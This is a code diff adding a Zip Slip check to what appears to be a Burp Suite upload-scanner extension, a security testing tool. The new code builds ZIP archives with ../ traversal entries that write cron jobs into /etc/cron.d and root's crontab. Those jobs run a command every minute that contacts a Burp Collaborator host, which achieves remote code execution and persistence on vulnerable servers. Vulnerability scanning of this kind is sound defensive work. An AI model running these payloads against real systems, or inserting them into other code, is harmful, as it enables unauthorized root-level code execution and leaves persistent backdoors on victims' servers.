@@ -1290,6 +1290,12 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                 _progress("Path traversal")
                 print "\nDoing path traversal checks"
                 self._path_traversal_archives(injector)
+            # Zip Slip - archive path traversal with collaborator-based cron detection
+            if injector.opts.modules['zipslip'].isSelected():
+                _progress("Zip Slip")
+                print "\nDoing Zip Slip checks"
+                colab_tests.extend(self._zip_slip(injector, burp_colab))
+                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
             # Polyglot - generic
             if injector.opts.modules['polyglot'].isSelected():
                 _progress("Polyglot")
@@ -3738,6 +3744,67 @@ trailer <<
                 # However, if we require that PK is not in the response, then it won't match any of the zip files
                 self.dl_matchers.add(DownloadMatcher(issue, filecontent=filecontent, not_in_filecontent="PK"))
                 self._send_simple(injector, self.ZIP_TYPES, basename, content)
+
+    def _zip_slip(self, injector, burp_colab):
+        # Zip Slip / CVE-2018-1002201 class: archive entries with ../ paths write files outside
+        # the extraction dir. Detection: write a cron job that contacts collaborator within 60s.
+        if not burp_colab:
+            return []
+
+        name = "Zip Slip (archive path traversal)"
+        severity = "High"
+        confidence = "Firm"
+        base_detail = "A crafted ZIP archive was uploaded with an entry whose filename traverses outside " \
+                      "the intended extraction directory (Zip Slip, CVE-2018-1002201 class). " \
+                      "If the server extracts without sanitising entry names, arbitrary files can be " \
+                      "written on the filesystem. See https://github.com/snyk/zip-slip-vulnerability for details. "
+        detail_colab = "A Burp Collaborator interaction was detected after uploading a ZIP archive whose " \
+                       "entry traverses to '{}'. A cron job using '{}' was written there and executed. " \
+                       "This confirms arbitrary file write outside the upload directory, typically leading " \
+                       "to Remote Code Execution. Interactions:<br><br>"
+
+        colab_tests = []
+
+        def _traversal_zip(entry_path, entry_content):
+            zipcontent = BytesIO()
+            zf = zipfile.ZipFile(zipcontent, "w", zipfile.ZIP_STORED)
+            info = zipfile.ZipInfo(entry_path)
+            info.compress_type = zipfile.ZIP_STORED
+            zf.writestr(info, entry_content)
+            zf.close()
+            zipcontent.seek(0)
+            return zipcontent.read()
+
+        zip_types = [
+            ('', '.zip', ''),
+            ('', '.zip', 'application/zip'),
+            ('', BurpExtender.MARKER_ORIG_EXT, ''),
+        ]
+
+        targets = []
+        for depth in range(2, 7):
+            prefix = "../" * depth
+            targets.append((depth, prefix + "etc/cron.d/upload_scanner"))
+            targets.append((depth, prefix + "var/spool/cron/crontabs/root"))
+
+        for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
+            domain_only = replace and not callable(replace)
+            for depth, entry_path in targets:
+                details = base_detail + detail_colab.format(entry_path, cmd)
+                issue = self._create_issue_template(injector.get_brr(), name, details, confidence, severity)
+                _ep = entry_path
+                _cmd = cmd
+                _do = domain_only
+                def _make_zip(_, full_url, _ep=_ep, _cmd=_cmd, _do=_do):
+                    url = full_url.split("://")[-1].rstrip("/") if _do else full_url
+                    cron_line = "* * * * * root {} {} 2>/dev/null\n".format(_cmd, url)
+                    return _traversal_zip(_ep, cron_line)
+                tag = entry_path.replace("/", "").replace(".", "").replace("_", "")[-8:]
+                basename = self.FILE_START + "ZipSlip" + str(depth) + tag + cmd_name
+                colab_tests.extend(self._send_collaborator(injector, burp_colab, zip_types, basename, "",
+                                                           issue, replace=_make_zip))
+
+        return colab_tests
 
     def _polyglot(self, injector, burp_colab):
         colab_tests = []
@@ -9377,6 +9444,7 @@ class OptionsPanel(JPanel, DocumentListener, ActionListener):
         self.module_labels['ssrf'], self.modules['ssrf'] = self.checkbox('Other SSRF:', True)
         self.module_labels['csv_spreadsheet'], self.modules['csv_spreadsheet'] = self.checkbox('CSV/spreadsheet:', True)
         self.module_labels['path_traversal'], self.modules['path_traversal'] = self.checkbox('Path traversal:', True)
+        self.module_labels['zipslip'], self.modules['zipslip'] = self.checkbox('Zip Slip (archive traversal):', True)
         self.module_labels['polyglot'], self.modules['polyglot'] = self.checkbox('CSP bypass polyglots:', True)
         if self.redl_enabled:
             self.module_labels['fingerping'], self.modules['fingerping'] = self.checkbox('Fingerping (fingerprint image libs):', True)
